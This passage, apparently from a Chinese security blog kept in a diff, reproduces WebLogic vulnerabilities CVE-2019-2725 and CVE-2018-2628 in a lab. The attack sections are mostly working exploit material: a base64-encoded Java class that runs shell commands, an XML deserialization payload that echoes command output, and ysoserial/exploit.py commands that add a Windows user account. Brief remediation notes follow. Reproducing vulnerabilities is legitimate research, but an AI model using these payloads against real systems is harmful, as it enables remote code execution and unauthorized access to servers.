in = <span class="keyword">new</span> FileInputStream(<span class="string">"C:\\Users\\lxhsec\\Downloads\\WeblogicCode\\src\\main\\java\\ResultBaseExec.class"</span>);</div><div class="line">        <span class="keyword">byte</span>[] data = toByteArray(in);</div><div class="line">        in.close();</div><div class="line">        String encode = base64Encoder.encodeBuffer(data);</div><div class="line">        System.out.println(encode);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yv66vgAAADIAXAoAGgArCAAsCgAtAC4KAAgALwgAMAoACAAxCgAyADMHADQIADUIADYKADIANwgAOAgAOQoAOgA7BwA8CgAPAD0HAD4KABEAPwgAQAoAEQBBBwBCCgAVACsKABUAQwoAFQBEBwBFBwBGAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABGV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHADQHAEcHAEgHADwHAD4BAApFeGNlcHRpb25zBwBJAQAKU291cmNlRmlsZQEAE1Jlc3VsdEJhc2VFeGVjLmphdmEMABsAHAEAB29zLm5hbWUHAEoMAEsAIAwATABNAQADd2luDABOAE8HAFAMAFEAUgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMAB8AUwEABy9iaW4vc2gBAAItYwcARwwAVABVAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAGwBWAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwAGwBXAQAADABYAE0BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAWQBaDABbAE0BAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABkAGgAAAAAAAgABABsAHAABAB0AAAAdAAEAAQAAAAUqtwABsQAAAAEAHgAAAAYAAQAAAAMACQAfACAAAgAdAAABCwAFAAgAAACTEgK4AANMK8YAKyu2AAQSBbYABpkAH7gABwa9AAhZAxIJU1kEEgpTWQUqU7YAC02nABy4AAcGvQAIWQMSDFNZBBINU1kFKlO2AAtNLLYADk67AA9ZLbcAEDoEuwARWRkEtwASOgUBOgYSEzoHGQW2ABRZOgbGABy7ABVZtwAWGQe2ABcZBrYAF7YAGDoHp//fGQewAAAAAgAeAAAAMgAMAAAABQAGAAcAFgAJADIADABLAA4AUAAPAFoAEABlABEAaAASAGwAEwB3ABUAkAAXACEAAAAuAAT8ADIHACL8ABgHACP/ACAACAcAIgcAIgcAIwcAJAcAJQcAJgcAIgcAIgAAIwAnAAAABAABACgAAQApAAAAAgAq</div></pre></td></tr></table></figure>
+<p>生成之后使用test_code测试，发现&gt;被解析成了我们想要的。</p>
+<p>替换<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">clazz.makeClassInitializer()</div><div class="line">        .insertAfter(<span class="string">""</span></div><div class="line">                + <span class="string">"String ua = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(\"lfcmd\");\n"</span></div><div class="line">                + <span class="string">"String R = \"yv66vgAAADIAXAoAGgArCAAsCgAtAC4KAAgALwgAMAoACAAxCgAyADMHADQIADUIADYKADIANwgAOAgAOQoAOgA7BwA8CgAPAD0HAD4KABEAPwgAQAoAEQBBBwBCCgAVACsKABUAQwoAFQBEBwBFBwBGAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABGV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHADQHAEcHAEgHADwHAD4BAApFeGNlcHRpb25zBwBJAQAKU291cmNlRmlsZQEAE1Jlc3VsdEJhc2VFeGVjLmphdmEMABsAHAEAB29zLm5hbWUHAEoMAEsAIAwATABNAQADd2luDABOAE8HAFAMAFEAUgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMAB8AUwEABy9iaW4vc2gBAAItYwcARwwAVABVAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAGwBWAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwAGwBXAQAADABYAE0BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAWQBaDABbAE0BAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABkAGgAAAAAAAgABABsAHAABAB0AAAAdAAEAAQAAAAUqtwABsQAAAAEAHgAAAAYAAQAAAAMACQAfACAAAgAdAAABCwAFAAgAAACTEgK4AANMK8YAKyu2AAQSBbYABpkAH7gABwa9AAhZAxIJU1kEEgpTWQUqU7YAC02nABy4AAcGvQAIWQMSDFNZBBINU1kFKlO2AAtNLLYADk67AA9ZLbcAEDoEuwARWRkEtwASOgUBOgYSEzoHGQW2ABRZOgbGABy7ABVZtwAWGQe2ABcZBrYAF7YAGDoHp//fGQewAAAAAgAeAAAAMgAMAAAABQAGAAcAFgAJADIADABLAA4AUAAPAFoAEABlABEAaAASAGwAEwB3ABUAkAAXACEAAAAuAAT8ADIHACL8ABgHACP/ACAACAcAIgcAIgcAIwcAJAcAJQcAJgcAIgcAIgAAIwAnAAAABAABACgAAQApAAAAAgAq\";"</span></div><div class="line">                + <span class="string">"sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();"</span></div><div class="line">                + <span class="string">"byte[] bt = decoder.decodeBuffer(R);"</span></div><div class="line">                + <span class="string">"org.mozilla.classfile.DefiningClassLoader cls = new org.mozilla.classfile.DefiningClassLoader();"</span></div><div class="line">                + <span class="string">"Class cl = cls.defineClass(\"ResultBaseExec\",bt);"</span></div><div class="line">                + <span class="string">"java.lang.reflect.Method m = cl.getMethod(\"exec\",new Class[]&#123;String.class&#125;);"</span></div><div class="line">                + <span class="string">"Object object = m.invoke(cl.newInstance(),new Object[]&#123;ua&#125;);"</span></div><div class="line">                + <span class="string">"weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();\n"</span></div><div class="line">                + <span class="string">"weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();\n"</span></div><div class="line">                + <span class="string">"outputStream.writeStream(new weblogic.xml.util.StringInputStream(object.toString()));\n"</span></div><div class="line">                + <span class="string">"outputStream.flush();\n"</span></div><div class="line">                + <span class="string">"response.getWriter().write(\"\");"</span></div><div class="line">                + <span class="string">""</span>);</div></pre></td></tr></table></figure></p>
+<p>然后运行JDK7u21,编译生成Byte[], 执行。<br><img src="/2019/03/04/middleware/CVE-2019-2725-03.png" alt="CVE-2019-2725-03.png"></p>
+<h4 id="Weblogic-12-1-3-回显构造"><a href="#Weblogic-12-1-3-回显构造" class="headerlink" title="Weblogic 12.1.3 回显构造."></a>Weblogic 12.1.3 回显构造.</h4><p>将<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">clazz.makeClassInitializer()</div><div class="line">        .insertAfter(&quot;&quot;</div><div class="line">                + &quot;String ua = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(\&quot;lfcmd\&quot;);\n&quot;</div><div class="line">                + &quot;String R = \&quot;yv66vgAAADIAXAoAGgArCAAsCgAtAC4KAAgALwgAMAoACAAxCgAyADMHADQIADUIADYKADIANwgAOAgAOQoAOgA7BwA8CgAPAD0HAD4KABEAPwgAQAoAEQBBBwBCCgAVACsKABUAQwoAFQBEBwBFBwBGAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABGV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHADQHAEcHAEgHADwHAD4BAApFeGNlcHRpb25zBwBJAQAKU291cmNlRmlsZQEAE1Jlc3VsdEJhc2VFeGVjLmphdmEMABsAHAEAB29zLm5hbWUHAEoMAEsAIAwATABNAQADd2luDABOAE8HAFAMAFEAUgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMAB8AUwEABy9iaW4vc2gBAAItYwcARwwAVABVAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAGwBWAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwAGwBXAQAADABYAE0BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAWQBaDABbAE0BAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABkAGgAAAAAAAgABABsAHAABAB0AAAAdAAEAAQAAAAUqtwABsQAAAAEAHgAAAAYAAQAAAAMACQAfACAAAgAdAAABCwAFAAgAAACTEgK4AANMK8YAKyu2AAQSBbYABpkAH7gABwa9AAhZAxIJU1kEEgpTWQUqU7YAC02nABy4AAcGvQAIWQMSDFNZBBINU1kFKlO2AAtNLLYADk67AA9ZLbcAEDoEuwARWRkEtwASOgUBOgYSEzoHGQW2ABRZOgbGABy7ABVZtwAWGQe2ABcZBrYAF7YAGDoHp//fGQewAAAAAgAeAAAAMgAMAAAABQAGAAcAFgAJADIADABLAA4AUAAPAFoAEABlABEAaAASAGwAEwB3ABUAkAAXACEAAAAuAAT8ADIHACL8ABgHACP/ACAACAcAIgcAIgcAIwcAJAcAJQcAJgcAIgcAIgAAIwAnAAAABAABACgAAQApAAAAAgAq\&quot;;&quot;</div><div class="line">                + &quot;sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();&quot;</div><div class="line">                + &quot;byte[] bt = decoder.decodeBuffer(R);&quot;</div><div class="line">                + &quot;org.mozilla.classfile.DefiningClassLoader cls = new org.mozilla.classfile.DefiningClassLoader();&quot;</div><div class="line">                + &quot;Class cl = cls.defineClass(\&quot;ResultBaseExec\&quot;,bt);&quot;</div><div class="line">                + &quot;java.lang.reflect.Method m = cl.getMethod(\&quot;exec\&quot;,new Class[]&#123;String.class&#125;);&quot;</div><div class="line">                + &quot;Object object = m.invoke(cl.newInstance(),new Object[]&#123;ua&#125;);&quot;</div><div class="line">                + &quot;weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();\n&quot;</div><div class="line">                + &quot;weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();\n&quot;</div><div class="line">                + &quot;outputStream.writeStream(new weblogic.xml.util.StringInputStream(object.toString()));\n&quot;</div><div class="line">                + &quot;outputStream.flush();\n&quot;</div><div class="line">                + &quot;response.getWriter().write(\&quot;\&quot;);&quot;</div><div class="line">                + &quot;&quot;);</div></pre></td></tr></table></figure></p>
+<p>转换成XMl格式，参考lufei给出的，稍微改一下。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">class</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>org.slf4j.ext.EventData<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">void</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">java</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"sun.misc.BASE64Decoder"</span>&gt;</span></div><div class="line">			<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"decodeBuffer"</span> <span class="attr">id</span>=<span class="string">"byte_arr"</span>&gt;</span>	<span class="tag">&lt;<span class="name">string</span>&gt;</span>yv66vgAAADIAXAoAGgArCAAsCgAtAC4KAAgALwgAMAoACAAxCgAyADMHADQIADUIADYKADIANwgAOAgAOQoAOgA7BwA8CgAPAD0HAD4KABEAPwgAQAoAEQBBBwBCCgAVACsKABUAQwoAFQBEBwBFBwBGAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABGV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHADQHAEcHAEgHADwHAD4BAApFeGNlcHRpb25zBwBJAQAKU291cmNlRmlsZQEAE1Jlc3VsdEJhc2VFeGVjLmphdmEMABsAHAEAB29zLm5hbWUHAEoMAEsAIAwATABNAQADd2luDABOAE8HAFAMAFEAUgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMAB8AUwEABy9iaW4vc2gBAAItYwcARwwAVABVAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAGwBWAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwAGwBXAQAADABYAE0BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAWQBaDABbAE0BAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABkAGgAAAAAAAgABABsAHAABAB0AAAAdAAEAAQAAAAUqtwABsQAAAAEAHgAAAAYAAQAAAAMACQAfACAAAgAdAAABCwAFAAgAAACTEgK4AANMK8YAKyu2AAQSBbYABpkAH7gABwa9AAhZAxIJU1kEEgpTWQUqU7YAC02nABy4AAcGvQAIWQMSDFNZBBINU1kFKlO2AAtNLLYADk67AA9ZLbcAEDoEuwARWRkEtwASOgUBOgYSEzoHGQW2ABRZOgbGABy7ABVZtwAWGQe2ABcZBrYAF7YAGDoHp//fGQewAAAAAgAeAAAAMgAMAAAABQAGAAcAFgAJADIADABLAA4AUAAPAFoAEABlABEAaAASAGwAEwB3ABUAkAAXACEAAAAuAAT8ADIHACL8ABgHACP/ACAACAcAIgcAIgcAIwcAJAcAJQcAJgcAIgcAIgAAIwAnAAAABAABACgAAQApAAAAAgAq<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">			<span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"org.mozilla.classfile.DefiningClassLoader"</span>&gt;</span></div><div class="line">			<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"defineClass"</span>&gt;</span></div><div class="line">				<span class="tag">&lt;<span class="name">string</span>&gt;</span>ResultBaseExec<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">				<span class="tag">&lt;<span class="name">object</span> <span class="attr">idref</span>=<span class="string">"byte_arr"</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></div><div class="line">				<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"newInstance"</span>&gt;</span></div><div class="line">					<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"exec"</span> <span class="attr">id</span>=<span class="string">"result"</span>&gt;</span></div><div class="line">						<span class="tag">&lt;<span class="name">string</span>&gt;</span>whoami<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">					<span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line">				<span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line">			<span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line"></div><div class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.Thread"</span> <span class="attr">method</span>=<span class="string">"currentThread"</span>&gt;</span></div><div class="line">			<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"getCurrentWork"</span> <span class="attr">id</span>=<span class="string">"current_work"</span>&gt;</span></div><div class="line">				<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"getClass"</span>&gt;</span></div><div class="line">					<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"getDeclaredField"</span>&gt;</span></div><div class="line">						<span class="tag">&lt;<span class="name">string</span>&gt;</span>connectionHandler<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">							<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"setAccessible"</span>&gt;</span><span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line">						<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></div><div class="line">							<span class="tag">&lt;<span class="name">object</span> <span class="attr">idref</span>=<span class="string">"current_work"</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></div><div class="line">							<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"getServletRequest"</span>&gt;</span></div><div class="line">								<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"getResponse"</span>&gt;</span></div><div class="line">									<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"getServletOutputStream"</span>&gt;</span></div><div class="line">										<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"writeStream"</span>&gt;</span></div><div class="line">											<span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"weblogic.xml.util.StringInputStream"</span>&gt;</span><span class="tag">&lt;<span class="name">object</span> <span class="attr">idref</span>=<span class="string">"result"</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></div><div class="line">											<span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line">										<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"flush"</span>/&gt;</span></div><div class="line">										<span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line">								<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"getWriter"</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"write"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line">								<span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line">							<span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line">						<span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line">					<span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line">				<span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line">			<span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">java</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">class</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>执行:<br><img src="/2019/03/04/middleware/CVE-2019-2725-09.png" alt="CVE-2019-2725-09.png"></p>
+<h2 id="Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）"><a href="#Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）" class="headerlink" title="Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）"></a>Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</h2><p>Weblogic Server WLS Core Components反序列化命令执行漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。</p>
+<p>使用<a href="https://www.exploit-db.com/exploits/44553" target="_blank" rel="external">exploit.py</a>脚本进行复现,具体使用方法见脚本。</p>
+<p>Kail  Attack ：192.168.31.232<br>Win03 victim : 192.168.124.130</p>
+<p>Kail 执行<br>1）下载ysoserial.jar<br><code>wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</code></p>
+<p>2）使用ysoserial.jar，启动JRMP Server<br><code>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]</code><br>其中，[command]是想执行的命令，而[listen port]是JRMP Server监听的端口。、<br>这里我执行<code>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#39;net user xiaohao xiaohao /add&#39;</code></p>
+<p>3）执行exploit.py<br><code>python2 exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]</code><br>其中，[victim ip]和[victim port]是目标weblogic的IP和端口，[path to ysoserial]是本地（Kail系统上的）ysoserial的路径，[JRMPListener ip]和[JRMPListener port]第一步中启动JRMP Server的IP地址和端口。[JRMPClient]是执行JRMPClient的类，可选的值是JRMPClient或JRMPClient2<br>这里我执行<code>python2 exploit.py 192.168.124.130 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.31.232 1099 JRMPClient2</code></p>
+<p>结果如下：<br><img src="/2019/03/04/middleware/CVE-2018-2628-01.png" alt="CVE-2018-2628-01"></p>
+<h3 id="修复建议-22"><a href="#修复建议-22" class="headerlink" title="修复建议"></a>修复建议</h3><p>1.过滤t3协议。<br>在域结构中点击 安全-&gt;筛选器<br>连接筛选器填: weblogic.security.net.ConnectionFilterImpl 保存后重启Weblogic.<br><img src="/2019/03/04/middleware/CVE-2018-2628-02.png" alt="CVE-2018-2628-02"></p>
+<p>kail再次攻击，Exp将报错。<br><img src="/2019/03/04/middleware/CVE-2018-2628-03.png" alt="CVE-2018-2628-03"></p>
+<p>连接筛选器规则可参考<a href="https://docs.oracle.com/cd/E12839_01/web.1111/e13711/con_filtr.htm#SCPRG386" target="_blank" rel="external">官方文档</a></p>
+<p>2.安装补丁，但是保不准下一次Weblogic缝缝补补的黑名单又被绕过。</p>
+<h2 id="Weblogic-任意文件上传漏洞（CVE-2018-2894）"><a href="#Weblogic-任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="Weblogic 任意文件上传漏洞（CVE-2018-2894）"></a>Weblogic 任意文件上传漏洞（CVE-2018-2894）</h2><p>Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在”生产模式”下默认不开启，所以该漏洞有一定限制。</p>
+<p>影响版本：12.1.3.0, 12.2.1.2, 12.2.1.3</p>
+<p>下载<a href="https://download.oracle.com/otn/nt/middleware/12c/wls/1213/fmw_12.1.3.0.0_wls.jar?AuthParam=1559722469_af3641f13a667dd5e487649c2d72d3d4" target="_blank" rel="external">Weblogic 12.1.3.0</a></p>
+<p>安装的时候将Weblogic放在Java JDK的bin目录下，防止出现因环境变量带空格导致的错误，安装过程一直点击下一步即可。<br><img src="/2019/03/04/middleware/weblogic02.png" alt="weblogic02"></p>
+<p>以下复现是在Weblogic开发模式下进行的，若需在生产模式下进行复现，则需要 登录后台页面，点击base_domain的配置，在”高级”设置中 开启 “启用 Web 服务测试页” 选项，经过我的验证发现开启之后，不仅需要账号密码登陆，即使登陆了也没有这两处上传点。<br><img src="/2019/03/04/middleware/weblogic03.png" alt="weblogic03"></p>
